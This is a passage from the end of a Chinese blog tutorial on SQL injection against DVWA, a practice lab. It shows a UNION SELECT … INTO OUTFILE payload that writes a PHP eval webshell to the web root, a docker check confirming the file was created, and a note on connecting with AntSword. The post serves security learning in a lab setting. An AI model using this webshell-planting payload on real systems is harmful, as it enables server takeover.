我们使用into outfile 写入一句话木马，文件名为shell2.php：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,&#34;&lt;?php eval($_POST[&#39;</span><span class=n>a</span><span class=s1>&#39;]);&#34; into outfile &#39;</span><span class=o>/</span><span class=n>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>shell2</span><span class=p>.</span><span class=n>php</span><span class=w>
</span></span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191909964.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191909964.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191909964.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326191909964.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326191909964.png title=image-20230326191909964></p><p>登陆宿主机查看，成功创建了一个shell2.php 文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>root@centos7 ~<span class=o>]</span><span class=c1># docker exec dvwa bash -c &#39;cd /var/www/html/; ls shell2.php; cat shell2.php&#39;</span>
</span></span><span class=line><span class=cl>shell2.php
</span></span><span class=line><span class=cl>1	&lt;?php eval<span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;a&#39;</span><span class=o>])</span><span class=p>;</span>
</span></span></code></pre></div><p>可以直接访问</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211146161.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211146161.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211146161.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211146161.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326211146161.png title=image-20230326211146161></p><p>使用蚁剑连接成功</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211358529.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211358529.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211358529.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326211358529.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326211358529.png title=image-20230326211358529></p><h3 id=参考链接>参考链接</h3><p><a href=https://www.cnblogs.com/zztac/p/11355622.html target=_blank rel="noopener noreffer">如何判断是字符型注入还是数字型注入 - ZZtac - 博客园 (cnblogs.com)</a></p><p><a href=https://www.cmd5.com/ target=_blank rel="noopener noreffer">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><h3 id=附录>附录</h3><p>知识点：MySQL 5.0以上版本，存在一个自带的数据库名为：nformation_schema（重点）。information_schema数据库中有三个表非常重要：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>SCHEMATA：表里包含所有数据库的名字
</span></span><span class=line><span class=cl>TABLES：表里包含所有数据库的所有表，默认字段为table<span class=nb>_</span>name
</span></span><span class=line><span class=cl>COLUMNS：表里包含所有数据库的所有表的所有字段
</span></span></code></pre></div><p>三个列非常重要：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>TABLE<span class=nb>_</span>SCHEMA：数据库名
</span></span><span class=line><span class=cl>TABLE<span class=nb>_</span>NAME：表名
</span></span><span class=line><span class=cl>COLUMN<span class=nb>_</span>NAME：字段名
</span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-03-25</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ data-title=常见sql注入漏洞><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Hacker News" data-sharer=hackernews data-url=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ data-title=常见sql注入漏洞><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ data-title=常见sql注入漏洞><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://senmer.github.io/posts/sql_injection/%E5%B8%B8%E8%A7%81sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/ data-title=常见sql注入漏洞><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/msf/msf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ class=prev rel=prev title=MSF漏洞利用><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>MSF漏洞利用</a>
<a href=/posts/scanning_tools/sqlmap%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/ class=next rel=next title=SQLmap安装和使用>SQLmap安装和使用<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.111.3">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank></a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{},search:{highlightTag:"em",lunrIndexURL:"/index.json",lunrLanguageCode:"zh",lunrSegmentitURL:"/lib/lunr/lunr.segmentit.js",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>